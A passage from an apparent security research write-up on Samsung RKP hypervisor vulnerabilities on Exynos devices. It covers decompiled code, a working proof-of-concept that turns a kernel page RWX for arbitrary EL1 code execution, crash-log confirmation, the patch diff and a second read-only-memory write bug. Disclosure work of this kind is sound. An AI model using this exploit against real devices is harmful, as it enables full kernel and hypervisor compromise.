<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_add_dynlist</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">dynlist_entry</span> <span class="o">=</span> <span class="n">static_heap_alloc</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">dynlist_entry</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">);</span>
  <span class="n">binary_base_pa</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_base</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">memlist_add_extra</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dynamic_load_regions</span><span class="p">,</span> <span class="n">binary_base_pa</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_size</span><span class="p">,</span> <span class="n">dynlist_entry</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="dynamic_load_rm_dynlist">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_rm_dynlist</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">binary_base_pa</span> <span class="o">=</span> <span class="n">rkp_get_pa</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_base</span><span class="p">);</span>
  <span class="n">res</span> <span class="o">=</span> <span class="n">memlist_remove_exact</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dynamic_load_regions</span><span class="p">,</span> <span class="n">binary_base_pa</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">binary_size</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dynlist_entry</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dynlist_entry</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">205</span><span class="p">,</span> <span class="s">"No dynamic descriptor"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">-11</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span> <span class="o">!=</span> <span class="n">dynlist_entry</span><span class="o">-&gt;</span><span class="n">code_base1</span> <span class="o">||</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size1</span> <span class="o">!=</span> <span class="n">dynlist_entry</span><span class="o">-&gt;</span><span class="n">code_size1</span><span class="p">)</span>
    <span class="o">--</span><span class="n">res</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_FIMC_COMBINED</span> <span class="o">&amp;&amp;</span>
      <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span> <span class="o">!=</span> <span class="n">dynlist_entry</span><span class="o">-&gt;</span><span class="n">code_base2</span> <span class="o">||</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size2</span> <span class="o">!=</span> <span class="n">dynlist_entry</span><span class="o">-&gt;</span><span class="n">code_size2</span><span class="p">))</span>
    <span class="o">--</span><span class="n">res</span><span class="p">;</span>
  <span class="n">static_heap_free</span><span class="p">(</span><span class="n">dynlist_entry</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="dynamic_load_rm_executable">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_rm_executable</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">res</span> <span class="o">=</span> <span class="n">memlist_remove_exact</span><span class="p">(</span><span class="o">&amp;</span><span class="n">executable_regions</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_FIMC_COMBINED</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">+=</span> <span class="n">memlist_remove_exact</span><span class="p">(</span><span class="o">&amp;</span><span class="n">executable_regions</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="dynamic_load_set_pxn">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_set_pxn</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="n">res</span> <span class="o">=</span> <span class="n">rkp_set_range_to_pxn</span><span class="p">(</span><span class="n">INIT_MM_PGD</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base1</span> <span class="o">+</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size1</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_FIMC_COMBINED</span><span class="p">)</span>
    <span class="n">res</span> <span class="o">+=</span> <span class="n">rkp_set_range_to_pxn</span><span class="p">(</span><span class="n">INIT_MM_PGD</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_base2</span> <span class="o">+</span> <span class="n">rkp_dyn</span><span class="o">-&gt;</span><span class="n">code_size2</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<div id="dynamic_load_rm">


<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">dynamic_load_rm</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="o">*</span> <span class="n">rkp_dyn</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_rm_dynlist</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">338</span><span class="p">,</span> <span class="s">"dynamic_load_rm_dynlist failed"</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mh">0xF13C0007</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_rm_executable</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">345</span><span class="p">,</span> <span class="s">"dynamic_load_rm_executable failed"</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mh">0xF13C0008</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_set_pxn</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">352</span><span class="p">,</span> <span class="s">"dynamic_load_set_pxn failed"</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mh">0xF13C0009</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">dynamic_load_rw</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"rkp_dynamic.c"</span><span class="p">,</span> <span class="mi">359</span><span class="p">,</span> <span class="s">"dynamic_load_rw failed"</span><span class="p">);</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mh">0xF13C000A</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<h2 id="exploitation_1">Exploitation<a class="headerlink" href="#exploitation_1" title="Permanent link">¶</a></h2>
<p>We have the ability to change memory that is <code>R-X</code> or <code>RW-</code> in the stage 2 to <code>RWX</code>.
 To be able to execute arbitrary code at EL1 using this vulnerability, 
the simplest way is to find a physical page that is already executable 
in the stage 1. Then we can use the virtual address of this page in the 
kernel's physmap (the Linux kernel <a href="https://www.kernel.org/doc/html/v5.0/core-api/boot-time-mm.html">physmap</a>, not RKP's <code>physmap</code>)
 to create a second mapping that is writable. By writing our code to the
 second mapping, and executing it from the first, we can achieve our 
arbitrary code execution.</p>
<div class="codehilite"><pre><span></span><code>          stage 1   stage 2
 EXEC_VA ---------+--------&gt; PAGE_PA
            R-X   |   R-X
                  |    ^---- will be changed to RWX
WRITE_VA ---------+
            RW-
</code></pre></div>

<p>By dumping the page tables of the stage 1, we easily found a double-mapped page.</p>
<div class="codehilite"><pre><span></span><code>...
ffffff80fa500000 - ffffff80fa700000 (PTE): R-X at 00000008f5520000 - 00000008f5720000
...
ffffffc800000000 - ffffffc880000000 (PMD): RW- at 0000000880000000 - 0000000900000000
...
</code></pre></div>

<p>For example, if we choose <code>0xffffff80fa500000</code> for the executable mapping, then the writable mapping will be at:</p>
<div class="codehilite"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">EXEC_VA</span> <span class="o">=</span> <span class="mh">0xffffff80fa6ff000</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">PAGE_PA</span> <span class="o">=</span> <span class="n">EXEC_VA</span> <span class="o">-</span> <span class="mh">0xffffff80fa500000</span> <span class="o">+</span> <span class="mh">0x00000008f5520000</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">PAGE_PA</span>
<span class="mh">0x8f571f000</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">WRITE_VA</span> <span class="o">=</span> <span class="mh">0xffffffc800000000</span> <span class="o">+</span> <span class="n">PAGE_PA</span> <span class="o">-</span> <span class="mh">0x0000000880000000</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">WRITE_VA</span>
<span class="mh">0xffffffc87571f000</span>
</code></pre></div>

<p>And by dumping the page tables of the stage 2, we can confirm that it is initially mapped as <code>R-X</code>.</p>
<div class="codehilite"><pre><span></span><code>...
0x8f571f000-0x8f5720000: S2AP=1, XN[1]=0
...
</code></pre></div>

<p>The last important things we need to take into account when writing 
our exploit are the data and instruction caches. To be safe, in our 
exploit we decided to prefix the code to execute with some "bootstrap" 
instructions that will clean the caches.</p>
<h3 id="proof-of-concept_1">Proof of Concept<a class="headerlink" href="#proof-of-concept_1" title="Permanent link">¶</a></h3>
<div class="codehilite"><pre><span></span><code><span class="cp">#define UH_APP_RKP            0xc300c002</span>
<span class="cp">#define RKP_DYNAMIC_LOAD      0x20</span>
<span class="cp">#define RKP_DYN_COMMAND_INS   0x01</span>
<span class="cp">#define RKP_DYN_FIMC_COMBINED 0x03</span>

<span class="cm">/* these 2 VAs point to the same PA */</span>
<span class="cp">#define EXEC_VA  0xffffff80fa6ff000UL</span>
<span class="cp">#define WRITE_VA 0xffffffc87571f000UL</span>

<span class="cm">/* bootstrap code to clean the caches */</span>
<span class="cp">#define DC_IVAC_IC_IVAU 0xd50b7520d5087620UL</span>
<span class="cp">#define DSB_ISH_ISB     0xd5033fdfd5033b9fUL</span>

<span class="kt">void</span> <span class="nf">exploit</span><span class="p">()</span> <span class="p">{</span>
    <span class="cm">/* fill the structure given as argument */</span>
    <span class="kt">uint64_t</span> <span class="n">rkp_dyn</span> <span class="o">=</span> <span class="n">kernel_alloc</span><span class="p">(</span><span class="mh">0x38</span><span class="p">);</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">rkp_dyn</span> <span class="o">+</span> <span class="mh">0x00</span><span class="p">,</span> <span class="n">RKP_DYN_FIMC_COMBINED</span><span class="p">);</span> <span class="c1">// type</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">rkp_dyn</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">,</span> <span class="n">kernel_alloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">));</span>  <span class="c1">// binary_base</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">rkp_dyn</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>                <span class="c1">// binary_size</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">rkp_dyn</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">EXEC_VA</span><span class="p">);</span>               <span class="c1">// code_base1</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">rkp_dyn</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>                <span class="c1">// code_size1</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">rkp_dyn</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">,</span> <span class="n">EXEC_VA</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>           <span class="c1">// code_base2</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">rkp_dyn</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>                <span class="c1">// code_size2</span>

    <span class="cm">/* call the hypervisor to make the page RWX */</span>
    <span class="n">kernel_hyp_call</span><span class="p">(</span><span class="n">UH_APP_RKP</span><span class="p">,</span> <span class="n">RKP_DYNAMIC_LOAD</span><span class="p">,</span> <span class="n">RKP_DYN_COMMAND_INS</span><span class="p">,</span> <span class="n">rkp_dyn</span><span class="p">);</span>

    <span class="cm">/* copy the code using the writable mapping */</span>
    <span class="kt">uint32_t</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
        <span class="mh">0xdeadbeef</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">,</span>
    <span class="p">};</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">WRITE_VA</span> <span class="o">+</span> <span class="mh">0x00</span><span class="p">,</span> <span class="n">DC_IVAC_IC_IVAU</span><span class="p">);</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">WRITE_VA</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">,</span> <span class="n">DSB_ISH_ISB</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">code</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
        <span class="n">kernel_write</span><span class="p">(</span><span class="n">WRITE_VA</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">2</span><span class="p">]);</span>

    <span class="cm">/* and execute it using the executable mapping */</span>
    <span class="n">kernel_exec</span><span class="p">(</span><span class="n">EXEC_VA</span><span class="p">,</span> <span class="n">WRITE_VA</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>As a result of running the proof of concept, we get an undefined 
instruction exception, that we can observe in the kernel log (note the <code>(deadbeef)</code> part):</p>
<div class="codehilite"><pre><span></span><code>&lt;2&gt;[  207.365236]  [3:     rkp_exploit:15549] sec_debug_set_extra_info_fault = UNDF / 0xffffff80fa6ff018
&lt;2&gt;[  207.365310]  [3:     rkp_exploit:15549] sec_debug_set_extra_info_fault: 0x1 / 0x726ff018
&lt;0&gt;[  207.365338]  [3:     rkp_exploit:15549] undefined instruction: pc=00000000dec42a2e, rkp_exploit[15549] (esr=0x2000000)
&lt;6&gt;[  207.365361]  [3:     rkp_exploit:15549] Code: d5087620 d50b7520 d5033b9f d5033fdf (deadbeef)
&lt;0&gt;[  207.365372]  [3:     rkp_exploit:15549] Internal error: undefined instruction: 2000000 [#1] PREEMPT SMP
&lt;4&gt;[  207.365386]  [3:     rkp_exploit:15549] Modules linked in:
&lt;0&gt;[  207.365401]  [3:     rkp_exploit:15549] Process rkp_exploit (pid: 15549, stack limit = 0x00000000b4f56d76)
&lt;0&gt;[  207.365418]  [3:     rkp_exploit:15549] debug-snapshot: core register saved(CPU:3)
&lt;0&gt;[  207.365430]  [3:     rkp_exploit:15549] L2ECTLR_EL1: 0000000000000007
&lt;0&gt;[  207.365438]  [3:     rkp_exploit:15549] L2ECTLR_EL1 valid_bit(30) is NOT set (0x0)
&lt;0&gt;[  207.365456]  [3:     rkp_exploit:15549] CPUMERRSR: 0000000000040001, L2MERRSR: 0000000013000000
&lt;0&gt;[  207.365468]  [3:     rkp_exploit:15549] CPUMERRSR valid_bit(31) is NOT set (0x0)
&lt;0&gt;[  207.365480]  [3:     rkp_exploit:15549] L2MERRSR valid_bit(31) is NOT set (0x0)
&lt;0&gt;[  207.365491]  [3:     rkp_exploit:15549] debug-snapshot: context saved(CPU:3)
&lt;6&gt;[  207.365541]  [3:     rkp_exploit:15549] debug-snapshot: item - log_kevents is disabled
&lt;6&gt;[  207.365574]  [3:     rkp_exploit:15549] TIF_FOREIGN_FPSTATE: 0, FP/SIMD depth 0, cpu: 89
&lt;4&gt;[  207.365590]  [3:     rkp_exploit:15549] CPU: 3 PID: 15549 Comm: rkp_exploit Tainted: G        W       4.14.113 #14
&lt;4&gt;[  207.365602]  [3:     rkp_exploit:15549] Hardware name: Samsung A51 EUR OPEN REV01 based on Exynos9611 (DT)
&lt;4&gt;[  207.365617]  [3:     rkp_exploit:15549] task: 00000000dcac38cb task.stack: 00000000b4f56d76
&lt;4&gt;[  207.365632]  [3:     rkp_exploit:15549] PC is at 0xffffff80fa6ff018
&lt;4&gt;[  207.365644]  [3:     rkp_exploit:15549] LR is at 0xffffff80fa6ff004
</code></pre></div>

<p>The exploit was successfully tested on the most recent firmware available for our test device (at the time of the report): <code>A515FXXU4CTJ1</code>.
 The two-fold bug appeared to be present in the binaries of Exynos 
devices, including the S10/S10+/S20/S20+ flagship devices, but its 
exploitability on these devices is uncertain.</p>
<p>The prerequisites for exploiting this vulnerability are high: being 
able to make an hypervisor call with only an arbitrary read and write of
 kernel memory is no small feat on devices where JOPP/ROPP are enabled.</p>
<h2 id="patch_1">Patch<a class="headerlink" href="#patch_1" title="Permanent link">¶</a></h2>
<p>Here are the immediate remediation steps we suggested to Samsung:</p>
<div class="codehilite"><pre><span></span><code>- Implement thorough checking in the "dynamic executable" commands:
    - The code segment(s) should not overlap any read-only pages
    (maybe checking the ro_bitmap or calling is_phys_map_free is enough)
    - dynamic_load_rw should not make the code segment(s) executable on failure
    (to prevent abusing it to create executable kernel pages...)
    - Ensure signature checking is enabled (it was disabled on some devices)
</code></pre></div>

<p>To see how Samsung patched this vulnerability, we binary diffed the 
most recent firmware available for the Samsung Galaxy S10 (at the time 
of checking the first patch): <code>G973FXXSBFUF3</code>. We could not 
use the latest firmware for the Samsung Galaxy A51 as this device had 
not been updated to the June patch level yet.</p>
<p>There have been some changes to <code>dynamic_load_check</code>:</p>
<div class="codehilite"><pre><span></span><code>int64_t dynamic_load_check(rkp_dynamic_load_t *rkp_dyn) {
    // ...

    if (rkp_dyn-&gt;type == RKP_DYN_MODULE)
        return -1;
<span class="gi">+    binary_base = rkp_dyn-&gt;binary_base;</span>
<span class="gi">+    binary_end = rkp_dyn-&gt;binary_size + binary_base;</span>
<span class="gi">+    code_base1 = rkp_dyn-&gt;code_base1;</span>
<span class="gi">+    code_end1 = rkp_dyn-&gt;code_size1 + code_base1;</span>
<span class="gi">+    if (code_base1 &lt; binary_base || code_end1 &gt; binary_end) {</span>
<span class="gi">+        uh_log('L', "rkp_dynamic.c", 71, "RKP_21f66fc1");</span>
<span class="gi">+        return -1;</span>
<span class="gi">+    }</span>
<span class="gi">+    if (rkp_dyn-&gt;type == RKP_DYN_FIMC_COMBINED) {</span>
<span class="gi">+        code_base2 = rkp_dyn-&gt;code_base2;</span>
<span class="gi">+        code_end2 = rkp_dyn-&gt;code_size2 + code_base2;</span>
<span class="gi">+        if (code_base2 &lt; binary_base || code_end2 &gt; binary_end) {</span>
<span class="gi">+            uh_log('L', "rkp_dynamic.c", 77, "RKP_915550ac");</span>
<span class="gi">+            return -1;</span>
<span class="gi">+        }</span>
<span class="gi">+        if ((code_base1 &gt; code_base2 &amp;&amp; code_base1 &lt; code_end2)</span>
<span class="gi">+                || (code_base2 &gt; code_base1 &amp;&amp; code_base2 &lt; code_end1)) {</span>
<span class="gi">+            uh_log('L', "rkp_dynamic.c", 83, "RKP_67b1bc82");</span>
<span class="gi">+            return -1;</span>
<span class="gi">+        }</span>
<span class="gi">+    }</span>
    binary_base_pa = rkp_get_pa(rkp_dyn-&gt;binary_base);
    if (memlist_overlaps_range(&amp;dynamic_load_regions, binary_base_pa, rkp_dyn-&gt;binary_size)) {
        uh_log('L', "rkp_dynamic.c", 91, "dynamic_load[%p~%p] is overlapped with another", binary_base_pa,rkp_dyn-&gt;binary_size);
        return -1;
    }
    if (pgt_bitmap_overlaps_range(binary_base_pa, rkp_dyn-&gt;binary_size))
        uh_log('D', "rkp_dynamic.c", 96, "dynamic_load[%p~%p] is ro", binary_base_pa, rkp_dyn-&gt;binary_size);
    return 0;
}
</code></pre></div>

<p>Some checks were added to ensure that both code segments are within 
the binary's address range. The new checks don't account for integer 
overflows on all the <code>base + size</code> additions, but we noticed that was fixed as well in the October security update.</p>
<p>Because the binary's address range is then checked against the <code>ro_bitmap</code> by the call to <code>pgt_bitmap_overlaps_range</code>, it should no longer be possible to change memory that is <code>R-X</code> into <code>RWX</code> in the stage 2. It is still possible to change memory that is <code>RW-</code> into <code>RWX</code>, but there are already <code>RWX</code>
 pages in the stage 2 and the hypervisor ensures that if such a page is 
mapped as executable in the stage 1, it will be changed to read-only in 
the stage 2.</p>
<h1 id="writing-to-read-only-kernel-memory">Writing to read-only kernel memory<a class="headerlink" href="#writing-to-read-only-kernel-memory" title="Permanent link">¶</a></h1>
<div class="codehilite"><pre><span></span><code>SVE-2021-20176 (CVE-2021-25411): Vulnerable api in RKP allows attackers to write read-only kernel memory

Severity: Moderate
Affected versions: Q(10.0), R(11.0) devices with Exynos9610, 9810, 9820, 9830
Reported on: January 4, 2021
Disclosure status: Privately disclosed.
Improper address validation vulnerability in RKP api prior to SMR JUN-2021 Release 1 allows root privileged local attackers to write read-only kernel memory.
The patch adds a proper address validation check to prevent unprivileged write to kernel memory.
</code></pre></div>

<h2 id="vulnerability_2">Vulnerability<a class="headerlink" href="#vulnerability_2" title="Permanent link">¶</a></h2>
<p>The <code>virt_to_phys_el1</code> function is used by RKP to convert a virtual address into a physical address.</p>
<div id="virt_to_phys_el1">


<div class="codehilite"><pre><span></span><code><span class="kt">uint64_t</span> <span class="nf">virt_to_phys_el1</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>

  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">addr</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">cs_enter</span><span class="p">(</span><span class="n">s2_lock</span><span class="p">);</span>
  <span class="n">ats12e1r</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
  <span class="n">isb</span><span class="p">();</span>
  <span class="n">par_el1</span> <span class="o">=</span> <span class="n">get_par_el1</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">par_el1</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ats12e1w</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
    <span class="n">isb</span><span class="p">();</span>
    <span class="n">par_el1</span> <span class="o">=</span> <span class="n">get_par_el1</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="n">cs_exit</span><span class="p">(</span><span class="n">s2_lock</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">par_el1</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">isb</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">get_sctlr_el1</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">uh_log</span><span class="p">(</span><span class="sc">'W'</span><span class="p">,</span> <span class="s">"vmm.c"</span><span class="p">,</span> <span class="mi">135</span><span class="p">,</span> <span class="s">"%sRKP_b0a499dd %p"</span><span class="p">,</span> <span class="s">"virt_to_phys_el1"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dword_87035098</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">dword_87035098</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="n">print_stack_contents</span><span class="p">();</span>
      <span class="p">}</span>
      <span class="n">dword_87035098</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">par_el1</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>virt_to_phys_el1</code> uses the <a href="https://developer.arm.com/documentation/ddi0595/2021-06/AArch64-Instructions/AT-S12E1R--Address-Translate-Stages-1-and-2-EL1-Read"><code>AT S12E1R</code></a>
 (Address Translate Stages 1 and 2 EL1 Read) instruction. This 
instruction performs stage 1 and 2 address translation, with permissions
 as if reading from the given virtual address from EL1. It then checks 
the <a href="https://developer.arm.com/documentation/ddi0595/2021-06/AArch64-Registers/PAR-EL1--Physical-Address-Register"><code>PAR_EL1</code></a>
 (Physical Address Register) register, that contains the output address 
from the address translation instruction if it executed successfully, or
 fault information if it did not.</p>
<p>If the address translation instruction failed, <code>virt_to_phys_el1</code> then uses the <a href="https://developer.arm.com/documentation/ddi0595/2021-06/AArch64-Instructions/AT-S12E1W--Address-Translate-Stages-1-and-2-EL1-Write"><code>AT S12E1W</code></a>
 (Address Translate Stages 1 and 2 EL1 Write) instruction. This 
instruction performs stage 1 and 2 address translation, with permissions
 as if writing from the given virtual address from EL1. It then also 
checks the <code>PAR_EL1</code> register.</p>
<p>If any of the two translation instructions succeeded, <code>virt_to_phys_el1</code>
 returns the output address. Otherwise, if the MMU is enabled, it logs a
 message and print the kernel stack contents (but only once).</p>
<p>Some of RKP's command handlers will call <code>virt_to_phys_el1</code> to convert a kernel virtual address, with the intent of writing to the corresponding physical address. Since <code>virt_to_phys_el1</code>
 returns if the address is readable and/or writable from EL1, we can 
abuse this to write to memory that is read-only for the kernel.</p>
<h2 id="exploitation_2">Exploitation<a class="headerlink" href="#exploitation_2" title="Permanent link">¶</a></h2>
